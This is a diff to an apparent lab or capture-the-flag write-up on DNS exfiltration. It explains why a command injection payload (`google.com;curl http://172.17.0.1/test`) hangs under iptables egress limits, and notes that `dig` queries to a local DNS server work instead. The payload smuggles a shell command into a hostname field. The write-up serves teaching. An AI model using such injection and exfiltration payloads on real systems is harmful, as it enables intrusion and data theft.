@@ -1,6 +1,6 @@
 # DNS Exfiltration
 ## Getting command injection
-Testing simple payloads like `google.com;curl http://172.17.0.1/test` will hang until the clean-up script `monitor-processes.sh` will kill it, generating the error message `Bad input!`. 
+Testing simple payloads like `google.com;curl http://172.17.0.1/test` will hang (because iptables only allowing outgoing TCP on ports 49335-49355) until the clean-up script `monitor-processes.sh` will kill it, generating the error message `Bad input!`. 
 
 After a bit of trail-and-error the user will find that command injection is possible by setting up a local DNS server and sending `dig` requests to it.
 
